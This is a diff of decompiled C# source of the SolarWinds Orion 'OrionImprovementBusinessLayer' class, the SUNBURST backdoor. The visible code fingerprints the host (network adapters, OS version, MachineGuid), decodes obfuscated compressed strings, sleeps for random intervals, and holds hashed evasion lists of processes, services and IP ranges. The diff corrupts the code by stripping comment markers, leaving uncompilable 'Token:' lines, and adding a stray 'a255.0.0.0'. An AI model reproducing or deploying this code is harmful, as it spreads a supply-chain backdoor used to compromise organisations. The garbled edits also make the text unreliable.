@@ -36,11 +36,11 @@ using SolarWinds.Orion.Core.SharedCredentials.Credentials;
 
 namespace SolarWinds.Orion.Core.BusinessLayer
 {
-	// Token: 0x0200000C RID: 12
+	Token: 0x0200000C RID: 12
 	internal class OrionImprovementBusinessLayer
 	{
-		// Token: 0x17000011 RID: 17
-		// (get) Token: 0x06000047 RID: 71 RVA: 0x00004254 File Offset: 0x00002454
+		 Token: 0x17000011 RID: 17
+		 (get) Token: 0x06000047 RID: 71 RVA: 0x00004254 File Offset: 0x00002454
 		public static bool IsAlive
 		{
 			get
@@ -63,9 +63,9 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			}
 		}
 
-		// Token: 0x17000012 RID: 18
-		// (get) Token: 0x06000048 RID: 72 RVA: 0x000042A8 File Offset: 0x000024A8
-		// (set) Token: 0x06000049 RID: 73 RVA: 0x000042F4 File Offset: 0x000024F4
+		 Token: 0x17000012 RID: 18
+		 (get) Token: 0x06000048 RID: 72 RVA: 0x000042A8 File Offset: 0x000024A8
+		 (set) Token: 0x06000049 RID: 73 RVA: 0x000042F4 File Offset: 0x000024F4
 		private static bool svcListModified1
 		{
 			get
@@ -90,9 +90,9 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			}
 		}
 
-		// Token: 0x17000013 RID: 19
-		// (get) Token: 0x0600004A RID: 74 RVA: 0x00004338 File Offset: 0x00002538
-		// (set) Token: 0x0600004B RID: 75 RVA: 0x0000437C File Offset: 0x0000257C
+		 Token: 0x17000013 RID: 19
+		 (get) Token: 0x0600004A RID: 74 RVA: 0x00004338 File Offset: 0x00002538
+		 (set) Token: 0x0600004B RID: 75 RVA: 0x0000437C File Offset: 0x0000257C
 		private static bool svcListModified2
 		{
 			get
@@ -115,7 +115,7 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			}
 		}
 
-		// Token: 0x0600004C RID: 76 RVA: 0x000043C0 File Offset: 0x000025C0
+		Token: 0x0600004C RID: 76 RVA: 0x000043C0 File Offset: 0x000025C0
 		public static void Initialize()
 		{
 			try
@@ -152,7 +152,7 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			}
 		}
 
-		// Token: 0x0600004D RID: 77 RVA: 0x000044C8 File Offset: 0x000026C8
+		Token: 0x0600004D RID: 77 RVA: 0x000044C8 File Offset: 0x000026C8
 		private static bool UpdateNotification()
 		{
 			int num = 3;
@@ -171,7 +171,7 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			return false;
 		}
 
-		// Token: 0x0600004E RID: 78 RVA: 0x00004504 File Offset: 0x00002704
+		Token: 0x0600004E RID: 78 RVA: 0x00004504 File Offset: 0x00002704
 		private static void Update()
 		{
 			bool flag = false;
@@ -284,7 +284,7 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			OrionImprovementBusinessLayer.HttpHelper.Close(httpHelper, thread);
 		}
 
-		// Token: 0x0600004F RID: 79 RVA: 0x00004720 File Offset: 0x00002920
+		Token: 0x0600004F RID: 79 RVA: 0x00004720 File Offset: 0x00002920
 		private static string GetManagementObjectProperty(ManagementObject obj, string property)
 		{
 			object value = obj.Properties[property].Value;
@@ -303,7 +303,7 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			return property + ": " + str + "\n";
 		}
 
-		// Token: 0x06000050 RID: 80 RVA: 0x000047DC File Offset: 0x000029DC
+		Token: 0x06000050 RID: 80 RVA: 0x000047DC File Offset: 0x000029DC
 		private static string GetNetworkAdapterConfiguration()
 		{
 			string text = "";
@@ -348,7 +348,7 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			return result;
 		}
 
-		// Token: 0x06000051 RID: 81 RVA: 0x00004998 File Offset: 0x00002B98
+		Token: 0x06000051 RID: 81 RVA: 0x00004998 File Offset: 0x00002B98
 		private static string GetOSVersion(bool full)
 		{
 			if (OrionImprovementBusinessLayer.osVersion == null || OrionImprovementBusinessLayer.osInfo == null)
@@ -393,7 +393,7 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			return OrionImprovementBusinessLayer.osInfo;
 		}
 
-		// Token: 0x06000052 RID: 82 RVA: 0x00004BE8 File Offset: 0x00002DE8
+		Token: 0x06000052 RID: 82 RVA: 0x00004BE8 File Offset: 0x00002DE8
 		private static string ReadDeviceInfo()
 		{
 			try
@@ -408,7 +408,7 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			return null;
 		}
 
-		// Token: 0x06000053 RID: 83 RVA: 0x00004C60 File Offset: 0x00002E60
+		Token: 0x06000053 RID: 83 RVA: 0x00004C60 File Offset: 0x00002E60
 		private static bool GetOrCreateUserID(out byte[] hash64)
 		{
 			string text = OrionImprovementBusinessLayer.ReadDeviceInfo();
@@ -421,8 +421,8 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			text += OrionImprovementBusinessLayer.domain4;
 			try
 			{
-				// HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
-				// MachineGuid
+				HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
+				MachineGuid
 				text += OrionImprovementBusinessLayer.RegistryHelper.GetValue(OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2jYz38Xd29In3dXT28PRzjQn2dwsJdwxyjfHNTC7KL85PK4lxLqosKMlPL0osyKgEAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("801MzsjMS3UvzUwBAA=="), "");
 			}
 			catch
@@ -446,7 +446,7 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			return true;
 		}
 
-		// Token: 0x06000054 RID: 84 RVA: 0x00004D40 File Offset: 0x00002F40
+		Token: 0x06000054 RID: 84 RVA: 0x00004D40 File Offset: 0x00002F40
 		private static bool IsNullOrInvalidName(string domain4)
 		{
 			string[] array = domain4.ToLower().Split(new char[]
@@ -474,7 +474,7 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			return false;
 		}
 
-		// Token: 0x06000055 RID: 85 RVA: 0x00004DD8 File Offset: 0x00002FD8
+		Token: 0x06000055 RID: 85 RVA: 0x00004DD8 File Offset: 0x00002FD8
 		private static void DelayMs(double minMs, double maxMs)
 		{
 			if ((int)maxMs == 0)
@@ -490,7 +490,7 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			Thread.Sleep((int)num);
 		}
 
-		// Token: 0x06000056 RID: 86 RVA: 0x00004E3B File Offset: 0x0000303B
+		Token: 0x06000056 RID: 86 RVA: 0x00004E3B File Offset: 0x0000303B
 		private static void DelayMin(int minMinutes, int maxMinutes)
 		{
 			if (maxMinutes == 0)
@@ -501,7 +501,7 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			OrionImprovementBusinessLayer.DelayMs((double)minMinutes * 60.0 * 1000.0, (double)maxMinutes * 60.0 * 1000.0);
 		}
 
-		// Token: 0x06000057 RID: 87 RVA: 0x00004E7C File Offset: 0x0000307C
+		Token: 0x06000057 RID: 87 RVA: 0x00004E7C File Offset: 0x0000307C
 		private static ulong GetHash(string s)
 		{
 			ulong num = 14695981039346656037UL;
@@ -519,7 +519,7 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			return num ^ 6605813339339102567UL;
 		}
 
-		// Token: 0x06000058 RID: 88 RVA: 0x00004EE4 File Offset: 0x000030E4
+		Token: 0x06000058 RID: 88 RVA: 0x00004EE4 File Offset: 0x000030E4
 		private static string Quote(string s)
 		{
 			if (s == null || !s.Contains(" ") || s.Contains("\""))
@@ -529,7 +529,7 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			return "\"" + s + "\"";
 		}
 
-		// Token: 0x06000059 RID: 89 RVA: 0x00004F18 File Offset: 0x00003118
+		Token: 0x06000059 RID: 89 RVA: 0x00004F18 File Offset: 0x00003118
 		private static string Unquote(string s)
 		{
 			if (s.StartsWith('"'.ToString()) && s.EndsWith('"'.ToString()))
@@ -539,7 +539,7 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			return s;
 		}
 
-		// Token: 0x0600005A RID: 90 RVA: 0x00004F5C File Offset: 0x0000315C
+		Token: 0x0600005A RID: 90 RVA: 0x00004F5C File Offset: 0x0000315C
 		private static string ByteArrayToHexString(byte[] bytes)
 		{
 			StringBuilder stringBuilder = new StringBuilder(bytes.Length * 2);
@@ -550,7 +550,7 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			return stringBuilder.ToString();
 		}
 
-		// Token: 0x0600005B RID: 91 RVA: 0x00004FA0 File Offset: 0x000031A0
+		Token: 0x0600005B RID: 91 RVA: 0x00004FA0 File Offset: 0x000031A0
 		private static byte[] HexStringToByteArray(string hex)
 		{
 			byte[] array = new byte[hex.Length / 2];
@@ -561,13 +561,13 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			return array;
 		}
 
-		// Token: 0x04000022 RID: 34
+		Token: 0x04000022 RID: 34
 		private static volatile bool _isAlive = false;
 
-		// Token: 0x04000023 RID: 35
+		Token: 0x04000023 RID: 35
 		private static readonly object _isAliveLock = new object();
 
-		// Token: 0x04000024 RID: 36
+		Token: 0x04000024 RID: 36
 		private static readonly ulong[] assemblyTimeStamps = new ulong[]
 		{
 			2597124982561782591UL,
@@ -709,7 +709,7 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			8408095252303317471UL
 		};
 
-		// Token: 0x04000025 RID: 37
+		Token: 0x04000025 RID: 37
 		private static readonly ulong[] configTimeStamps = new ulong[]
 		{
 			17097380490166623672UL,
@@ -731,16 +731,16 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			17984632978012874803UL
 		};
 
-		// Token: 0x04000026 RID: 38
+		Token: 0x04000026 RID: 38
 		private static readonly object svcListModifiedLock = new object();
 
-		// Token: 0x04000027 RID: 39
+		Token: 0x04000027 RID: 39
 		private static volatile bool _svcListModified1 = false;
 
-		// Token: 0x04000028 RID: 40
+		Token: 0x04000028 RID: 40
 		private static volatile bool _svcListModified2 = false;
 
-		// Token: 0x04000029 RID: 41
+		Token: 0x04000029 RID: 41
 		private static readonly OrionImprovementBusinessLayer.ServiceConfiguration[] svcList = new OrionImprovementBusinessLayer.ServiceConfiguration[]
 		{
 			new OrionImprovementBusinessLayer.ServiceConfiguration
@@ -1042,11 +1042,11 @@ namespace SolarWinds.Orion.Core.BusinessLayer
 			}
 		};
 
-		// Token: 0x0400002A RID: 42
+		Token: 0x0400002A RID: 42
 		private static readonly OrionImprovementBusinessLayer.IPAddressesHelper[] nList = new OrionImprovementBusinessLayer.IPAddressesHelper[]
 		{
-			// 10.0.0.0
-			// 255.0.0.0
+			 10.0.0.0
+			 a255.0.0.0
 			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzTQA0MA"), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMAQQA="), OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
 			// 172.16.0.0
 			// 255.240.0.0
